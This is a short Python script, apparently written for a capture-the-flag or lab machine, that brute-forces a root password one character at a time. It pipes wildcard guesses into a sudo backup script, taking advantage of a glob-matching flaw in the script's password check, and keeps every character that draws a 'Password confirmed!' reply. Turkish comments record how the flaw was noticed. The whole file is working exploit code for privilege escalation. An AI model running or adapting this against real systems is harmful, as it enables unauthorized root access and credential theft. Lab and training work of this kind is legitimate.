import string
import subprocess
import pty
total = list(string.ascii_letters + string.digits)

password = ""
while True:
	for t in total:
		cmd = f"echo {password}{t}* | sudo /opt/scripts/mysql-backup.sh"
		#pty.spawn(cmd)
		#subprocess.call([cmd]) 
		output = subprocess.run(cmd,stdout=True,shell=True,stderr=subprocess.PIPE,text=True).stdout # sifre girerken ilk harfi k girdigimde kabul etti k disinda hic biseyi kabul etmedi buradan
# anlasiliyo k dan sonra hangi harfi confirm ederse sifreye ekliyor.
		if "Password confirmed!" in output:
			password += t
			print (password)
			break	
		else:
			continue
	
